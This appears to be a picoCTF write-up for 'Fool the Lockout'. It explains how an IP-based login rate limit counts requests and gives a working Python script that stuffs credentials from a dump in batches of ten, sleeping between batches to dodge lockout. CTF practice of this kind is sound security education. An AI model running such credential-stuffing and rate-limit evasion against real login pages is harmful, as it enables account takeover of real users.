# Fool the Lockout

## Summary
The login endpoint applies an IP-based rate limit that only counts POST requests and locks an IP after more than 10 failed attempts within a 30-second window. That means we can safely try 10 credentials, sleep just over 30 seconds to reset the window, and continue. With the provided credential dump, this guarantees eventual success without triggering a lockout.

## Key Recon From Source
- Rate limiting is per IP and counts only POST requests.
- MAX_REQUESTS = 10
- EPOCH_DURATION = 30 seconds
- LOCKOUT_DURATION = 120 seconds
- Lockout triggers only when num_requests > MAX_REQUESTS

## Exploit Plan
1. Send 10 login attempts.
2. Sleep 31 seconds to reset the epoch window.
3. Repeat until a login succeeds.
4. Fetch / to read the flag.

## Script (sol.py)
```python
# solve.py
import os
import time
import re
import requests

def normalize_base_url(url: str) -> str:
    url = url.strip()
    if url.endswith("/"):
        url = url[:-1]
    # Allow people to pass the full /login URL.
    if url.lower().endswith("/login"):
        url = url[:-6]
    return url

# Base host only (no path). Override with env var if needed.
BASE_URL = normalize_base_url(
    os.environ.get("BASE_URL", "http://candy-mountain.picoctf.net:52971/login")
)
CREDS_FILE = "creds-dump.txt"

BATCH_SIZE = 10          # MAX_REQUESTS
SLEEP_SECONDS = 31       # EPOCH_DURATION + 1

def try_login(session, username, password):
    r = session.post(
        f"{BASE_URL}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=10,
    )
    # Successful login redirects to "/"
    if r.status_code == 302 and r.headers.get("Location", "").endswith("/"):
        return True
    return False

def fetch_flag(session):
    r = session.get(f"{BASE_URL}/", timeout=10)
    m = re.search(r"flag\\{.*?\\}", r.text, re.IGNORECASE)
    if m:
        return m.group(0)
    return None

def main():
    with open(CREDS_FILE, "r", encoding="utf-8") as f:
        creds = [line.strip().split(";", 1) for line in f if line.strip()]

    session = requests.Session()

    for i, (u, p) in enumerate(creds, start=1):
        ok = try_login(session, u, p)
        print(f"[{i}/{len(creds)}] {u}:{p} -> {'OK' if ok else 'no'}")

        if ok:
            flag = fetch_flag(session)
            print("FLAG:", flag or "(found login, but flag not matched)")
            return

        if i % BATCH_SIZE == 0:
            print(f"Sleeping {SLEEP_SECONDS}s to avoid lockout...")
            time.sleep(SLEEP_SECONDS)

if __name__ == "__main__":
    main()
```

## Run
```powershell
python .\sol.py
```

